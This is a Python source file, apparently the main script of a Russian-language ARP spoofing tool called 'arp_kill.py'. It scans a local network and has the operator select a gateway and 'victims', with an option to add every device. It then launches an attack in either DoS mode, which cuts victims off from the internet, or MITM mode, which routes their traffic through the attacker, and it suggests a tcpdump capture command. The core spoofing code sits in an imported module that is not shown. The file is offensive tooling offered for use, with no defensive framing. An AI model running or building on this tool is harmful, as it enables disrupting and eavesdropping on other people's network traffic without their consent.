#!/usr/bin/env python3
import os
import sys
import time
import subprocess
from modules.fzf_selector import run_fzf
from modules.interface_manager import get_interfaces, get_network_info_enhanced
from modules.gateway_detector import get_gateway_info
from modules.network_scanner import find_local_network_devices
from modules.banner import show_banner
from modules.arp_utils import get_mac_by_arp
from attack import ARPAttack

def main_menu():
    """Главное меню программы"""
    show_banner()
    
    # Выбор интерфейса
    interfaces = get_interfaces()
    if not interfaces:
        print("\033[1;31m[!] Не найдены сетевые интерфейсы\033[0m")
        sys.exit(1)
    
    interface = run_fzf(interfaces, "📡 Выберите интерфейс →")
    if not interface:
        print("\033[1;33m[!] Интерфейс не выбран\033[0m")
        sys.exit(1)
    
    # Получаем сетевую информацию
    local_ip, local_mac, network_mask = get_network_info_enhanced(interface)
    if not local_ip:
        print(f"\033[1;31m[!] Не удалось получить информацию для {interface}\033[0m")
        sys.exit(1)
    
    # Автоматически определяем шлюз
    print(f"\n\033[1;33m[*] Автоматически определяю шлюз...\033[0m")
    gateway_ip, gateway_mac = get_gateway_info()
    
    print(f"\n\033[1;32m[✓] Интерфейс:\033[0m \033[1;36m{interface}\033[0m")
    print(f"\033[1;32m[✓] Ваш IP:\033[0m \033[1;36m{local_ip}\033[0m")
    print(f"\033[1;32m[✓] Ваш MAC:\033[0m \033[1;36m{local_mac}\033[0m")
    print(f"\033[1;32m[✓] Маска сети:\033[0m \033[1;36m/{network_mask}\033[0m")
    
    if gateway_ip:
        print(f"\033[1;32m[✓] Найден шлюз:\033[0m \033[1;36m{gateway_ip}\033[0m")
        if gateway_mac:
            print(f"\033[1;32m[✓] MAC шлюза:\033[0m \033[1;36m{gateway_mac}\033[0m")
    else:
        print(f"\033[1;33m[!] Шлюз не найден автоматически\033[0m")
    
    return {
        'interface': interface,
        'local_ip': local_ip,
        'local_mac': local_mac,
        'network_mask': network_mask,
        'gateway_ip': gateway_ip,
        'gateway_mac': gateway_mac
    }

def handle_action(action, devices, attack, network_info, available_victims):
    """Обработка выбранного действия"""
    if "Выбрать шлюз" in action:
        # Выбираем шлюз из списка
        device_list = [f"{d['ip']:15s} | {d['mac']}" for d in devices]
        gateway_choice = run_fzf(device_list, "🌐 Выберите шлюз (роутер) →")
        if gateway_choice:
            gateway_ip = gateway_choice.split('|')[0].strip()
            for d in devices:
                if d['ip'] == gateway_ip:
                    network_info['gateway_mac'] = d['mac']
                    network_info['gateway_ip'] = gateway_ip
                    print(f"\033[1;32m[✓] Шлюз выбран: {gateway_ip} ({network_info['gateway_mac']})\033[0m")
                    # Обновляем объект атаки
                    attack.gateway_ip = gateway_ip
                    attack.gateway_mac = network_info['gateway_mac']
                    break
        return 'continue'
    
    elif "Ввести шлюз вручную" in action:
        # Ввод шлюза вручную
        gateway_ip = input("\n\033[1;34m[?] Введите IP шлюза: \033[0m").strip()
        # Определяем MAC шлюза
        gateway_mac = get_mac_by_arp(gateway_ip, retries=3)
        if gateway_mac:
            network_info['gateway_ip'] = gateway_ip
            network_info['gateway_mac'] = gateway_mac
            attack.gateway_ip = gateway_ip
            attack.gateway_mac = gateway_mac
        return 'continue'
    
    elif "Выбрать жертвы из списка" in action:
        # Выбираем жертвы из списка (множественный выбор)
        victims_list = []
        for d in available_victims:
            victims_list.append(f"{d['ip']:15s} | {d['mac']}")
        
        selected_victims = run_fzf(victims_list, 
                                   "🎯 Выберите жертвы (Space для выбора, Enter для подтверждения) →", 
                                   multi=True)
        if selected_victims:
            for victim_str in selected_victims:
                victim_ip = victim_str.split('|')[0].strip()
                for d in available_victims:
                    if d['ip'] == victim_ip:
                        # Проверяем, не добавлена ли уже эта жертва
                        if not any(v['ip'] == victim_ip for v in attack.victims):
                            attack.add_victim(victim_ip, d['mac'])
                            print(f"\033[1;32m[+] Жертва добавлена: {victim_ip}\033[0m")
                        break
        return 'continue'
    
    elif "Добавить все устройства" in action:
        # Добавляем все устройства как жертвы
        count = 0
        for d in devices:
            if d['ip'] != network_info['local_ip'] and \
               (not network_info['gateway_ip'] or d['ip'] != network_info['gateway_ip']):
                if not any(v['ip'] == d['ip'] for v in attack.victims):
                    attack.add_victim(d['ip'], d['mac'])
                    count += 1
        print(f"\033[1;32m[+] Добавлено {count} жертв\033[0m")
        return 'continue'
    
    elif "Удалить жертву из списка" in action:
        # Удаляем жертву из списка
        if attack.get_victim_count() > 0:
            victims_list = [f"{v['ip']:15s} | {v['mac']}" for v in attack.victims]
            victim_to_remove = run_fzf(victims_list, "➖ Выберите жертву для удаления →")
            if victim_to_remove:
                victim_ip = victim_to_remove.split('|')[0].strip()
                attack.remove_victim(victim_ip)
                print(f"\033[1;33m[-] Жертва удалена: {victim_ip}\033[0m")
        return 'continue'
    
    elif "Очистить список жертв" in action:
        # Очищаем список жертв
        attack.victims = []
        print(f"\033[1;33m[-] Список жертв очищен\033[0m")
        return 'continue'
    
    elif "Ввести жертвы вручную" in action:
        # Ввод жертв вручную
        print("\n\033[1;34m[?] Введите IP жертв (через пробел или запятую):\033[0m")
        victim_ips_input = input("   IP жертв: ").strip()
        
        # Разделяем ввод
        victim_ips = []
        for separator in [',', ' ', ';', '|']:
            if separator in victim_ips_input:
                victim_ips = [ip.strip() for ip in victim_ips_input.split(separator) if ip.strip()]
                break
        
        if not victim_ips:
            victim_ips = [victim_ips_input]
        
        for victim_ip in victim_ips:
            if victim_ip:
                # Определяем MAC жертвы
                print(f"\n\033[1;33m[*] Определяю MAC жертвы {victim_ip}...\033[0m")
                victim_mac = get_mac_by_arp(victim_ip, retries=3)
                
                if victim_mac:
                    # Проверяем, не добавлена ли уже эта жертва
                    if not any(v['ip'] == victim_ip for v in attack.victims):
                        attack.add_victim(victim_ip, victim_mac)
                        print(f"\033[1;32m[+] Жертва добавлена: {victim_ip}\033[0m")
        return 'continue'
    
    elif "Повторить сканирование" in action:
        # Просто продолжаем цикл (начнется с нового сканирования)
        return 'rescan'
    
    elif "Выйти в главное меню" in action:
        return 'exit'
    
    elif "Начать атаку" in action:
        # Проверяем, есть ли все данные для атаки
        if not attack.gateway_ip or not attack.gateway_mac:
            print("\033[1;31m[!] Не указан шлюз!\033[0m")
            return 'continue'
        
        if attack.get_victim_count() == 0:
            print("\033[1;31m[!] Нет выбранных жертв!\033[0m")
            return 'continue'
        
        return 'attack'
    
    return 'continue'

def scan_and_attack_mode(network_info):
    """Режим сканирования и атаки"""
    attack = ARPAttack(
        network_info['interface'], 
        network_info['gateway_ip'] if 'gateway_ip' in network_info else None,
        network_info['gateway_mac'] if 'gateway_mac' in network_info else None
    )
    
    # Цикл выбора с опцией повторного сканирования
    while True:
        # Агрессивное сканирование сети
        devices = find_local_network_devices(
            network_info['local_ip'], 
            network_info['network_mask']
        )
        
        # Выводим найденные устройства
        print(f"\n\033[1;32m{'═'*60}\033[0m")
        if devices:
            print(f"\033[1;42m НАЙДЕНО УСТРОЙСТВ: {len(devices)} ".center(60) + "\033[0m")
        else:
            print(f"\033[1;41m УСТРОЙСТВА НЕ НАЙДЕНЫ ".center(60) + "\033[0m")
        print(f"\033[1;32m{'═'*60}\033[0m")
        
        # Отображаем текущих выбранных жертв
        if attack.get_victim_count() > 0:
            print(f"\033[1;35m[✓] Выбрано жертв: {attack.get_victim_count()}\033[0m")
            for i, victim in enumerate(attack.victims, 1):
                print(f"  \033[1;36m{i}. {victim['ip']} ({victim['mac']})\033[0m")
            print()
        
        for i, device in enumerate(devices, 1):
            # Помечаем уже выбранных жертв
            is_selected = any(v['ip'] == device['ip'] for v in attack.victims)
            if is_selected:
                print(f"\033[1;41m{i:3d}. IP: {device['ip']:15s} | MAC: {device['mac']} ✓\033[0m")
            else:
                print(f"\033[1;36m{i:3d}. IP: {device['ip']:15s} | MAC: {device['mac']}\033[0m")
        
        # Создаем список опций
        options_list = []
        
        # Опция выбора шлюза (только если еще не выбран)
        if not network_info.get('gateway_ip') or not network_info.get('gateway_mac'):
            if devices:
                options_list.append("🌐 Выбрать шлюз из списка")
            else:
                options_list.append("🌐 Ввести шлюз вручную")
        
        # Опции для жертв
        if devices:
            # Показываем устройства, которые еще не выбраны как жертвы
            available_victims = []
            for d in devices:
                if d['ip'] != network_info['local_ip'] and \
                   (not network_info.get('gateway_ip') or d['ip'] != network_info['gateway_ip']):
                    # Проверяем, не выбрана ли уже эта жертва
                    if not any(v['ip'] == d['ip'] for v in attack.victims):
                        available_victims.append(d)
            
            if available_victims:
                options_list.append("🎯 Выбрать жертвы из списка (несколько)")
                options_list.append("➕ Добавить все устройства в список жертв")
            
            if attack.get_victim_count() > 0:
                options_list.append("➖ Удалить жертву из списка")
                options_list.append("🗑️  Очистить список жертв")
            
            if attack.get_victim_count() > 0:
                options_list.append("🔥 Начать атаку на выбранных жертв")
        else:
            options_list.append("🎯 Ввести жертвы вручную")
        
        # Общие опции
        options_list.append("🔄 Повторить сканирование сети")
        options_list.append("❌ Выйти в главное меню")
        
        # Выбор действия
        action = run_fzf(options_list, "📋 Выберите действие →")
        if not action:
            return None
        
        # Обработка выбранного действия
        result = handle_action(
            action, 
            devices, 
            attack, 
            network_info,
            available_victims if 'available_victims' in locals() else []
        )
        
        # Обработка результатов
        if result == 'attack':
            return attack
        elif result == 'exit':
            return None
        elif result == 'rescan':
            continue  # Просто продолжаем цикл (начнется с нового сканирования)

def manual_mode(network_info):
    """Ручной режим ввода данных"""
    print("\n\033[1;34m[?] Введите данные вручную:\033[0m")
    
    attack = ARPAttack(
        network_info['interface'], 
        network_info['gateway_ip'] if 'gateway_ip' in network_info else None,
        network_info['gateway_mac'] if 'gateway_mac' in network_info else None
    )
    
    # Предлагаем использовать автоматически найденный шлюз
    if network_info.get('gateway_ip'):
        use_auto = run_fzf(
            [f"✅ Использовать автоматически найденный шлюз ({network_info['gateway_ip']})", 
             "📝 Ввести другой шлюз"], 
            "🌐 Выберите шлюз →"
        )
        if use_auto and "автоматически" in use_auto:
            print(f"\033[1;32m[✓] Использую шлюз: {network_info['gateway_ip']}\033[0m")
            if not network_info.get('gateway_mac'):
                print(f"\033[1;33m[*] Определяю MAC шлюза {network_info['gateway_ip']}...\033[0m")
                network_info['gateway_mac'] = get_mac_by_arp(network_info['gateway_ip'], retries=3)
            
            # Обновляем объект атаки
            attack.gateway_ip = network_info['gateway_ip']
            attack.gateway_mac = network_info['gateway_mac']
        else:
            gateway_ip = input("   IP шлюза (роутера): ").strip()
            gateway_mac = get_mac_by_arp(gateway_ip, retries=3)
            
            # Обновляем объект атаки
            attack.gateway_ip = gateway_ip
            attack.gateway_mac = gateway_mac
    else:
        gateway_ip = input("   IP шлюза (роутера): ").strip()
        gateway_mac = get_mac_by_arp(gateway_ip, retries=3)
        
        # Обновляем объект атаки
        attack.gateway_ip = gateway_ip
        attack.gateway_mac = gateway_mac
    
    # Ввод жертв
    print("\n\033[1;34m[?] Введите IP жертв (через пробел или запятую):\033[0m")
    victim_ips_input = input("   IP жертв: ").strip()
    
    # Разделяем ввод
    victim_ips = []
    for separator in [',', ' ', ';', '|']:
        if separator in victim_ips_input:
            victim_ips = [ip.strip() for ip in victim_ips_input.split(separator) if ip.strip()]
            break
    
    if not victim_ips:
        victim_ips = [victim_ips_input]
    
    # Получаем MAC адреса жертв
    for victim_ip in victim_ips:
        if victim_ip:
            print(f"\n\033[1;33m[*] Определяю MAC жертвы {victim_ip}...\033[0m")
            victim_mac = get_mac_by_arp(victim_ip, retries=3)
            
            if victim_mac:
                attack.add_victim(victim_ip, victim_mac)
    
    return attack

def confirm_and_start_attack(attack, network_info):
    """Подтверждение и запуск атаки"""
    if not attack.gateway_ip or not attack.gateway_mac:
        print("\033[1;31m[!] Шлюз не указан. Выход.\033[0m")
        sys.exit(1)
    
    if attack.get_victim_count() == 0:
        print("\033[1;31m[!] Нет выбранных жертв. Выход.\033[0m")
        sys.exit(1)
    
    # Передаем локальный MAC и IP в объект атаки
    if 'local_mac' in network_info:
        attack.set_local_mac(network_info['local_mac'])
    if 'local_ip' in network_info:
        attack.set_local_ip(network_info['local_ip'])
    
    # Выбор режима атаки
    mode = run_fzf(
        ["☠  Режим DoS (полное отключение интернета)", 
         "👁️  Режим MITM (трафик через ваш компьютер, нужен IP forward)"], 
        "🎯 Выберите тип атаки →"
    )
    
    if mode and "MITM" in mode:
        attack.set_mitm_mode(True)
        mode_text = "MITM (трафик пойдет через ваш компьютер)"
        warning = "\033[1;32m✓  Жертвы будут иметь доступ к интернету через ваш ПК\033[0m"
        print("\033[1;33m[!] Для перехвата трафика используйте Wireshark или tcpdump:\033[0m")
        print(f"\033[1;36m    sudo tcpdump -i {attack.interface} -w capture.pcap\033[0m")
    else:
        attack.set_mitm_mode(False)
        mode_text = "DoS (полное отключение интернета)"
        warning = "\033[1;31m⚠  Все выбранные жертвы потеряют доступ к интернету!\033[0m"
    
    # Подтверждение
    print(f"""
\033[1;31m{'═'*60}\033[0m
\033[1;41m{' ВНИМАНИЕ: АТАКА НАЧНЕТСЯ '.center(60)}\033[0m
\033[1;31m{'═'*60}\033[0m

\033[1;33m🌐 Шлюз:\033[0m    \033[1;36m{attack.gateway_ip}\033[0m (\033[1;35m{attack.gateway_mac}\033[0m)
\033[1;33m🎯 Жертвы ({attack.get_victim_count()}):\033[0m""")
    
    for i, victim in enumerate(attack.victims, 1):
        print(f"      {i:2d}. \033[1;36m{victim['ip']}\033[0m (\033[1;35m{victim['mac']}\033[0m)")
    
    print(f"""
\033[1;33m📡 Интерфейс:\033[0m \033[1;36m{attack.interface}\033[0m
\033[1;33m⚡ Режим:\033[0m     \033[1;36m{mode_text}\033[0m

{warning}
\033[1;32m✓  Нажмите \033[1;33mCtrl+C\033[1;32m для остановки и восстановления\033[0m
""")
    
    confirm = run_fzf(["✅ Да, начать атаку", "❌ Нет, отменить"], "🔥 Подтвердить запуск? →")
    if not confirm or "отменить" in confirm.lower():
        print("\033[1;33m[!] Атака отменена\033[0m")
        sys.exit(0)
    
    # Запуск атаки
    attack.start_attack()

def main():
    # Проверка прав
    if os.geteuid() != 0:
        print("\033[1;31m[!] Требуются права root! Запустите:\033[0m")
        print("\033[1;33m    sudo python3 arp_kill.py\033[0m")
        sys.exit(1)
    
    # Основной цикл программы
    while True:
        try:
            # Получаем основную информацию о сети
            network_info = main_menu()
            
            # Выбор режима
            mode_options = [
                "🔍 Агрессивное сканирование сети",
                "📝 Ввести данные вручную",
                "❌ Выход"
            ]
            
            mode = run_fzf(mode_options, "🎯 Выберите режим →")
            if not mode:
                continue
            
            if "выход" in mode.lower():
                print("\033[1;33m[!] Выход из программы\033[0m")
                sys.exit(0)
            
            if "сканирование" in mode.lower():
                attack = scan_and_attack_mode(network_info)
                if attack:
                    confirm_and_start_attack(attack, network_info)
                    # После завершения атаки спрашиваем, что делать дальше
                    continue_choice = run_fzf(["🔄 Начать новую атаку", "❌ Выход"], "Что делать дальше? →")
                    if not continue_choice or "выход" in continue_choice.lower():
                        print("\033[1;33m[!] Выход из программы\033[0m")
                        sys.exit(0)
                    # Иначе начинаем заново
            else:
                attack = manual_mode(network_info)
                confirm_and_start_attack(attack, network_info)
                # После завершения атаки спрашиваем, что делать дальше
                continue_choice = run_fzf(["🔄 Начать новую атаку", "❌ Выход"], "Что делать дальше? →")
                if not continue_choice or "выход" in continue_choice.lower():
                    print("\033[1;33m[!] Выход из программы\033[0m")
                    sys.exit(0)
                # Иначе начинаем заново
        
        except KeyboardInterrupt:
            print("\n\033[1;33m[!] Программа прервана пользователем\033[0m")
            sys.exit(0)
        except Exception as e:
            print(f"\n\033[1;31m[!] Ошибка: {str(e)}\033[0m")
            import traceback
            traceback.print_exc()
            print("\n\033[1;33m[!] Возврат в главное меню...\033[0m")
            time.sleep(2)

if __name__ == "__main__":
    main()
